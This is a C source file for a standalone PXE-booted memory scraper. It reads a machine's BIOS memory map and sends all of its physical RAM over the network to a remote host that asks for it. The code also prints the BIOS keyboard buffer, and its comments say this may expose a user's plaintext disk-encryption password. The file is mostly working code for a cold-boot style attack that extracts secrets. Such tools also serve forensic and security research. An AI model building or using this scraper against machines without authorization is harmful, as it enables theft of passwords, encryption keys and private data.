/*-
 * Copyright (c) 2007-2008
 *      Bill Paul <wpaul@windriver.com>.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Bill Paul.
 * 4. Neither the name of the author nor the names of any co-contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY Bill Paul AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL Bill Paul OR THE VOICES IN HIS HEAD
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
 * THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "types.h"
#include "data.h"
#include "pxe.h"
#include "pxeapi.h"
#include "protocol.h"
#include "bios.h"
#include "stand.h"

static uint8_t pkt[PKT_SIZE + sizeof(SCRAPE_MSG)];
static int mapped = 0;

#ifndef SILENT
static uint32_t tw = 0x7C2F2D5C;
#endif

static int
checkA20 (void)
{
	uint32_t	m0, m1;
	volatile uint32_t *	p0 = (uint32_t *)0x000000;
	volatile uint32_t *	p1 = (uint32_t *)0x100000;

	/* Save original value */
	m0 = *p0;

	/* Write some new data */
	*p0 = 0xcafebabe;

	/* See if it shows up at the next 1MB offset */
	m1 = *p1;

	/* Restore original value */
	*p0 = m0;

	/* If m1 changed when we updated m0, A20 line isn't set. */

	return (m1 == 0xcafebabe);
}

#ifndef SILENT
static void
twiddle(void)
{
	uint32_t t;
	printf ("%c", tw & 0xFF);
	t = tw;
	tw >>= 8;
	tw |= tw << 24;
	return;
}
#endif

static void
send_block(IP4_t dst, off_t daddr,
    uint64_t len, size_t size)
{
	int		i;
	SCRAPE_MSG *	m;
	uint8_t *	p;
	char *		s;

	/*
	 * Once we dump the first 640K, expand our memory
	 * mappings. (Applies to x86-64 only.)
	 */

	if (mapped == 0 && daddr >= 0x100000) {
		mapped++;
		mapmem();
	}

	m = (SCRAPE_MSG *)pkt;
	p = pkt;
	p += sizeof(SCRAPE_MSG);
	s = (char *)(uintptr_t)daddr;

	for (i = 0; i < len / size; i++) {
		bcopy_long ((uintptr_t *)s, (uintptr_t *)p, size);
		m->sm_cmd = htonl(SM_CMD_RESP);
		m->sm_len = size;
		m->sm_len = htonll(m->sm_len);
		m->sm_seq = (uintptr_t)s;
		m->sm_seq = htonll(m->sm_seq);
		m->sm_off = 0;
		while (pxe_write(dst, SM_PORT, (void *)pkt,
		    size + sizeof(SCRAPE_MSG)) != 0);
		s += size;
	}

	return;
}

/*
 * The Cygwin version of gcc insists on putting special runtime startup
 * code in any module that contains a real main() routine. As a standalone
 * app, we don't need any of that, so we deliberately use _main() as our
 * C entry point instead.
 */

void
_main(void)
{
	uint64_t total;
 	uint16_t port;
	IP4_t addr, dstaddr, myaddr;
	struct bios_smap bmap[32];
	int segs;
#ifndef SILENT
	int i;
	uint16_t * c;
#endif
	uint8_t *p;
	int sendsize;
	uint64_t start = 0;
	SCRAPE_MSG * m;

#ifndef SILENT
	printf("PXE memory scraper, written by Bill Paul (%s %s)\n",
	    __DATE__, __TIME__);
#endif

	if (checkA20() != 0) {
#ifndef SILENT
		printf("Failed to set A20 line, aborting.\n");
#endif
		return;
	}

	if (pxe_init(&myaddr, &sendsize) != 0) {
#ifndef SILENT
		printf("PXE not available\n");
#endif
		return;
	}

	sendsize = 1024;

	/* Figure out how much RAM is available  */

	total = 0;
	segs = 0;
	bios_next = 0;
	bzero((char *)bmap, sizeof(bmap));

	do {
		bios_memmap();
		if (bios_smap.type != SMAP_MEM)
			continue;
#ifndef SILENT
		printf("Memory segment %d: base: 0x%016llx: size: %llu (0x%llx)\n",
		    segs, bios_smap.base, bios_smap.len, bios_smap.len);
#endif
		bmap[segs].base = htonll(bios_smap.base);
		bmap[segs].len = htonll(bios_smap.len);
		segs++;
		total += bios_smap.len;
		if (segs == 0)
			start = bmap[segs].base;
	} while (bios_next != 0);

	/* New style memory map access failed, try old style. */

	if (total == 0) {
		bios_memmap2();
		start = 0;
		total = 0x100000;
		bmap[segs].base = htonll(start);
		bmap[segs].len = htonll(total);
		segs++;
		bmap[segs].base = htonll(total);
		bmap[segs].len = htonll(bios_ext1 * 1024);
#ifndef SILENT
		printf("Memory segment %d: base: 0x%016llx: size: %llu (0x%llx)\n",
		    segs, total, bios_ext1 * 1024, bios_ext1 * 1024);
#endif
		segs++;
		total += bios_ext1 * 1024;
		bmap[segs].base = htonll(total);
		bmap[segs].len = htonll(bios_ext2 * 64 * 1024);
#ifndef SILENT
		printf("Memory segment %d: base: 0x%016llx: size: %llu (0x%llx)\n",
		    segs, total, bios_ext2 * 64 * 1024, bios_ext2 * 64 * 1024);
#endif
		total = (bios_ext1 * 1024) + (bios_ext2 * 64 * 1024);
		segs++;
	}

#ifndef SILENT
	printf("Total memory: %llu bytes\n", total);
#endif

	/*
	 * Dump keyboard buffer. This is already going to be
	 * dumped to disk, but printing it here may prove
	 * illuminating. Some disk encryption utilities
	 * use BIOS keyboard input to read the user's password
	 * and some OSes don't blank the keyboard buffer region.
	 * This means that in some scenarios, it may be possible
	 * to immediately recover a user's plaintext password
	 * (or at least the first 16 bytes of it).
	 */

#ifndef SILENT
	printf("Keyboard buffer: [");
	c = (uint16_t *)(BIOS_KEYBDBUF_BASE);
	for (i = 0; i < BIOS_KEYBDBUF_SIZE / 2; i++) {
                uint8_t ch;
                ch = c[i] & 0xFF;
                if (ch == '\r' || ch == '\n')
			printf(" ");
		else
			printf("%c", ch);
	}
	printf("]\n");
#endif

	pxe_open();

#ifndef SILENT
	printf ("TX size is %d bytes\n", sendsize);
	printf ("Waiting for handshake...");
#endif

	/* Wait for handshake */

	port = SM_PORT;
	addr = myaddr;
	while (pxe_read(&addr, &port, (void *)pkt, sizeof(SCRAPE_MSG), 0))
#ifndef SILENT
		twiddle();
#else
		;
#endif

	dstaddr = addr;

	m = (SCRAPE_MSG *)pkt;

	if (ntohl(m->sm_cmd) != SM_CMD_PROBE) {
#ifndef SILENT
		printf("Malformed probe\n");
#endif
		return;
	}

#ifndef SILENT
	printf("\nGot handshake from: %d.%d.%d.%d\n", IP_ARGS(dstaddr));

	for (i = 0; i < 10; i++)
		twiddle();
#endif

	/* Send a reply, along with a copy of the memory map */

	m->sm_cmd = htonl(SM_CMD_RESP);
	m->sm_len = htonll(total);
	m->sm_off = htonl(sendsize);
	m->sm_seq = htonll(start);
	p = pkt;
	p += sizeof(SCRAPE_MSG);
	bcopy ((char *)bmap, p, sizeof(bmap));

#ifndef SILENT
	printf ("Sending reply\n");
#endif

	if (pxe_write(dstaddr, SM_PORT, (void *)pkt,
	    sizeof(bmap) + sizeof(SCRAPE_MSG)) != 0) {
#ifndef SILENT
		printf("sending handshake reply failed\n");
#endif
		return;
	}

#ifndef SILENT
	printf ("Dumping memory contents.\n");
#endif

	while (1) {
		port = SM_PORT;
		addr = myaddr;
		pxe_read(&addr, &port, (void *)pkt, sizeof(SCRAPE_MSG), 1);

		/* If asked to quit, then quit. */
		if (ntohl(m->sm_cmd) == SM_CMD_QUIT)
			break;

		if (ntohl(m->sm_cmd) != SM_CMD_REQ) {
#ifndef SILENT
			printf("Malformed request\n");
#endif
			return;
		}

		send_block (dstaddr, ntohll(m->sm_seq),
		    ntohll(m->sm_len), sendsize);
#ifndef SILENT
		twiddle();
#endif
	}

	/* That's all for now. */

#ifndef SILENT
	printf("Dump complete\n");
#endif
	return;
}
